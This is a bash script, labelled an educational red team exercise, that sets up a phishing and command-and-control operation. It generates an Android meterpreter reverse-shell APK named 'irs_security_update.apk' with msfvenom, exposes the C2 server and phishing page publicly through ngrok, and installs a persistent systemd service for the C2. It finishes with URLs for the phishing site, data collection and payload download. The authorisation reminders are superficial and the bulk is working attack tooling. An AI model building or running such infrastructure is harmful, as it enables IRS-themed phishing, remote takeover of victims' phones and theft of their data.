#!/bin/bash

# Red Team Exercise Deployment Script
# Educational penetration testing infrastructure

echo "======================================"
echo "RED TEAM EXERCISE DEPLOYMENT"
echo "======================================"

# Check if running as authorized user
if [[ $EUID -eq 0 ]]; then
   echo "Warning: Running as root. Ensure this is authorized."
fi

# Install Python dependencies
echo "[*] Installing dependencies..."
pip3 install flask flask-cors > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[-] Failed to install Python dependencies"
    echo "    Try: pip3 install flask flask-cors"
    exit 1
fi

# Check if APK generation tools are available
echo "[*] Checking for APK generation tools..."
if command -v msfvenom &> /dev/null; then
    echo "[+] Metasploit found - can generate advanced APK payloads"
    read -p "Generate Metasploit APK payload? [y/N]: " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        read -p "Enter your IP address: " LHOST
        read -p "Enter port (default 4444): " LPORT
        LPORT=${LPORT:-4444}
        
        echo "[*] Generating APK with msfvenom..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o irs_security_update.apk
        
        if [ $? -eq 0 ]; then
            echo "[+] APK generated successfully"
        else
            echo "[-] APK generation failed - using test APK"
        fi
    fi
else
    echo "[!] Metasploit not found - using educational test APK"
fi

# Set up ngrok for external access (optional)
if command -v ngrok &> /dev/null; then
    echo "[+] ngrok found"
    read -p "Use ngrok for external access? [y/N]: " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo "[*] Starting ngrok tunnel..."
        ngrok http 5000 > /dev/null 2>&1 &
        sleep 3
        
        # Get ngrok URL
        NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
        if [ "$NGROK_URL" != "null" ]; then
            echo "[+] External URL: $NGROK_URL"
            
            # Update JavaScript with ngrok URL
            sed -i.bak "s|localhost:5000|$(echo $NGROK_URL | sed 's|http://||')|g" script.js
        fi
    fi
fi

# Create systemd service for persistence (educational)
echo "[*] Creating service file for demonstration..."
cat > redteam-c2.service << EOF
[Unit]
Description=Red Team Exercise C2 Server
After=network.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$(pwd)
ExecStart=/usr/bin/python3 $(pwd)/c2_server.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

echo "[+] Service file created: redteam-c2.service"
echo "    To install: sudo cp redteam-c2.service /etc/systemd/system/"

# Set permissions
chmod +x c2_server.py

# Display network information
echo ""
echo "======================================"
echo "DEPLOYMENT INFORMATION"
echo "======================================"
echo "Local IP addresses:"
ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1

echo ""
echo "Deployment commands:"
echo "  Start C2 server: python3 c2_server.py"
echo "  View statistics: curl http://localhost:5000/stats"
echo "  Clear data: curl http://localhost:5000/clear"

echo ""
echo "Mock Social Engineering Challenge URLs:"
echo "  Phishing site: http://localhost:8000 (your HTML server)"
echo "  C2 Data collection: http://localhost:5000"
echo "  APK download: http://localhost:5000/download/irs_security_update.apk"
echo ""
echo "Setup Instructions:"
echo "  1. Start your HTML server: python3 -m http.server 8000"
echo "  2. Start C2 server: python3 c2_server.py" 
echo "  3. Visit http://localhost:8000 on target device"

echo ""
echo "======================================"
echo "EXERCISE CHECKLIST"
echo "======================================"
echo "□ Verify authorized testing scope"
echo "□ Document all activities"
echo "□ Test phishing site functionality"
echo "□ Verify APK generation/download"
echo "□ Monitor data collection"
echo "□ Plan post-exercise cleanup"

echo ""
echo "Ready to start red team exercise!"
echo "Run: python3 c2_server.py"